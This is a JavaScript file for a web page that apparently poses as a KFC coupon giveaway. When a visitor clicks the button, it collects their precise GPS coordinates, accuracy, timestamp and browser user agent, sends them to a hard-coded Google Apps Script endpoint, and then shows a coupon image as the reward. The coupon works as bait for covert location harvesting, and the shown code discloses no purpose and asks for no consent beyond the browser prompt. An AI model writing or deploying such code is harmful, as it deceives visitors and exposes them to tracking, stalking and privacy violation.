// Web App URL from Google Apps Script deployment
const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyRuMtjQj06d1BGveMWdM4vWNw9Tysso93gtb7rHyNjfoexLekafuN_5Kms9GOQoook/exec';

const sendBtn = document.getElementById('sendBtn');
const statusEl = document.getElementById('status');

sendBtn && sendBtn.addEventListener('click', () => sendLocation());

async function sendLocation(){
  if(!navigator.geolocation){ statusEl.textContent = 'Not supported by this browser.'; return; }
  statusEl.textContent = 'Hello...Customers! Please wait...';
  navigator.geolocation.getCurrentPosition(async (pos) => {
    const payload = {
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      timestamp: new Date(pos.timestamp).toISOString(),
      userAgent: navigator.userAgent
    };
    try{
      // Use JSONP via script tag to avoid CORS issues when page origin is file:// or other origins.
      const params = new URLSearchParams();
      params.set('lat', payload.lat);
      params.set('lon', payload.lon);
      params.set('accuracy', payload.accuracy);
      params.set('timestamp', payload.timestamp);
      params.set('userAgent', encodeURIComponent(payload.userAgent));

      const cbName = '__gps_cb_' + Date.now() + '_' + Math.floor(Math.random()*1000);
      params.set('callback', cbName);
      const url = SCRIPT_URL + '?' + params.toString();

      const script = document.createElement('script');
      let timedOut = false;
      const timeout = setTimeout(() => {
        timedOut = true;
        window[cbName] = null;
        if (script.parentNode) script.parentNode.removeChild(script);
        statusEl.textContent = 'Click Button Again.';
      }, 15000);

      window[cbName] = function(data) {
        clearTimeout(timeout);
        try{
          if (data && data.status === 'ok') {
            // show image on success
            statusEl.innerHTML = '<img src="assets/img/kfc-coupons.jpg" alt="Saved" style="max-width:100%;display:block;" />';
          } else {
            statusEl.textContent = 'Server error: ' + (data && data.message ? data.message : 'unknown');
          }
        } finally {
          // cleanup
          try{ delete window[cbName]; }catch(e){ window[cbName] = null; }
          if (script.parentNode) script.parentNode.removeChild(script);
        }
      };

      script.src = url;
      script.async = true;
      document.head.appendChild(script);
    } catch(err){
      statusEl.textContent = 'Network error: ' + err.message;
    }
  }, (err) => {
    statusEl.textContent = 'Location error: ' + err.message;
  }, { enableHighAccuracy: true, timeout: 150000 });
}
